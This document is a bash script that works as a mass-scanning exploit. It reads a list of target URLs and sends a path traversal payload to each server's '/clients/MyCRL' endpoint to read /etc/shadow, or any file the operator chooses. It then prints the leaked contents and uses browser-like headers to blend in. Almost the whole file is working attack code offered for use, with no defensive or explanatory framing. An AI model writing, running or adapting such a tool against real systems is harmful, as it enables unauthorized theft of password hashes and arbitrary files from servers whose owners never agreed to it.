#!/bin/bash

make_request() {
    local url=$1
    local payload=$2
    local headers=$3
    local vuln=("root:" "nobody:")

    response=$(curl -s -k -X POST -d "$payload" -H "$headers" "$url")
    if [[ $? -eq 0 ]]; then
        for word in "${vuln[@]}"; do
            if [[ "$response" == *"$word"* ]]; then
                echo "[+] $url is vulnerable"
                if [[ "$payload" == *"aCSHELL/../../../../../../../etc/shadow"* ]]; then
                    echo "╔══════════════════════════════════════════════════════╗"
                    echo "║                      etc/shadow found:               ║"
                    echo "╚══════════════════════════════════════════════════════╝"
                    echo "╔══════════════════════════════════════════════════════╗"
                    echo "                      $response                "
                    echo "╚══════════════════════════════════════════════════════╝"
                else
                    echo "╔══════════════════════════════════════════════════════╗"
                    echo "║                      Your file was found:            ║"
                    echo "╚══════════════════════════════════════════════════════╝"
                    echo "╔══════════════════════════════════════════════════════╗"
                    echo "                      $response                "
                    echo "╚══════════════════════════════════════════════════════╝"
                fi
                return
            fi
        done
        echo "[-] $url is not vulnerable"
    else
        echo "[-] $url responded with error"
    fi
}

main() {
    payload="aCSHELL/../../../../../../../etc/shadow"
    headers="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close"

    while getopts "l:f:" opt; do
        case ${opt} in
            l ) list_file=$OPTARG ;;
            f ) custom_file=$OPTARG ;;
            \? ) echo "Invalid option: $OPTARG" 1>&2 ;;
        esac
    done
    shift $((OPTIND -1))

    payload_base="aCSHELL/../../../../../../../${custom_file:-etc/shadow}"

    if [[ -n "$list_file" ]]; then
        if [[ -f "$list_file" ]]; then
            while IFS= read -r url; do
                url=$(echo "$url" | xargs)
                if [[ "$url" == http://* || "$url" == https://* ]]; then
                    make_request "$url/clients/MyCRL" "$payload_base" "$headers"
                else
                    echo "Skipping invalid URL: $url"
                fi
            done < "$list_file"
        else
            echo "Error: File '$list_file' not found."
        fi
    else
        echo "Please provide a file containing list of HTTP/HTTPS targets using -l option."
    fi
}

main "$@"
